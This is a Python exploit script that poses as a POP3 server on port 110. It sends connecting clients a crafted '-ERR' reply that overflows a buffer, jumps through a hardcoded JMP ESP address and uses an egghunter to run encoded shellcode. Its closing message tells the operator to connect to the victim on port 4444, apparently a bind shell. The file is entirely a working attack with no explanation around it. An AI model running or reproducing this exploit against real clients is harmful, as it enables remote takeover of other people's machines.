import sys, socket
from  struct import pack

def p32(x):
	return pack("<I",x)
egg=("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8\x77\x30\x30\x74\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")


shellcode=("\xb8\xde\xcc\xd1\xc9\xda\xce\xd9\x74\x24\xf4\x5d\x29\xc9\xb1"
"\x53\x83\xed\xfc\x31\x45\x0e\x03\x9b\xc2\x33\x3c\xdf\x33\x31"
"\xbf\x1f\xc4\x56\x49\xfa\xf5\x56\x2d\x8f\xa6\x66\x25\xdd\x4a"
"\x0c\x6b\xf5\xd9\x60\xa4\xfa\x6a\xce\x92\x35\x6a\x63\xe6\x54"
"\xe8\x7e\x3b\xb6\xd1\xb0\x4e\xb7\x16\xac\xa3\xe5\xcf\xba\x16"
"\x19\x7b\xf6\xaa\x92\x37\x16\xab\x47\x8f\x19\x9a\xd6\x9b\x43"
"\x3c\xd9\x48\xf8\x75\xc1\x8d\xc5\xcc\x7a\x65\xb1\xce\xaa\xb7"
"\x3a\x7c\x93\x77\xc9\x7c\xd4\xb0\x32\x0b\x2c\xc3\xcf\x0c\xeb"
"\xb9\x0b\x98\xef\x1a\xdf\x3a\xcb\x9b\x0c\xdc\x98\x90\xf9\xaa"
"\xc6\xb4\xfc\x7f\x7d\xc0\x75\x7e\x51\x40\xcd\xa5\x75\x08\x95"
"\xc4\x2c\xf4\x78\xf8\x2e\x57\x24\x5c\x25\x7a\x31\xed\x64\x13"
"\xf6\xdc\x96\xe3\x90\x57\xe5\xd1\x3f\xcc\x61\x5a\xb7\xca\x76"
"\x9d\xe2\xab\xe8\x60\x0d\xcc\x21\xa7\x59\x9c\x59\x0e\xe2\x77"
"\x99\xaf\x37\xed\x91\x16\xe8\x10\x5c\xe8\x58\x95\xce\x81\xb2"
"\x1a\x31\xb1\xbc\xf0\x5a\x5a\x41\xfb\x75\xc7\xcc\x1d\x1f\xe7"
"\x98\xb6\xb7\xc5\xfe\x0e\x20\x35\xd5\x26\xc6\x7e\x3f\xf0\xe9"
"\x7e\x15\x56\x7d\xf5\x7a\x62\x9c\x0a\x57\xc2\xc9\x9d\x2d\x83"
"\xb8\x3c\x31\x8e\x2a\xdc\xa0\x55\xaa\xab\xd8\xc1\xfd\xfc\x2f"
"\x18\x6b\x11\x09\xb2\x89\xe8\xcf\xfd\x09\x37\x2c\x03\x90\xba"
"\x08\x27\x82\x02\x90\x63\xf6\xda\xc7\x3d\xa0\x9c\xb1\x8f\x1a"
"\x77\x6d\x46\xca\x0e\x5d\x59\x8c\x0e\x88\x2f\x70\xbe\x65\x76"
"\x8f\x0f\xe2\x7e\xe8\x6d\x92\x81\x23\x36\xa2\xcb\x69\x1f\x2b"
"\x92\xf8\x1d\x36\x25\xd7\x62\x4f\xa6\xdd\x1a\xb4\xb6\x94\x1f"
"\xf0\x70\x45\x52\x69\x15\x69\xc1\x8a\x3c")


jmpesp=p32(0x7E429353)
sploit="-ERR "+"\x90"*(723-len("192.168.99.5"))

sploit+=jmpesp
sploit+=egg
sploit+="\x90"*227
sploit+="w00t"+shellcode

try:
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind(('', 110))
	s.listen(1)
	print ("[*] Listening on port 110.")
	print ("[*] Have someone connect to you.")
	print ("[*] Type <control>-c to exit.")
	conn, addr = s.accept()
	print '[*] Received connection from: ', addr

	while 1:
		conn.send(sploit)
except:
	print ("[*] Done. Wait a bit for the egghunter then connect to the victim on port 4444")
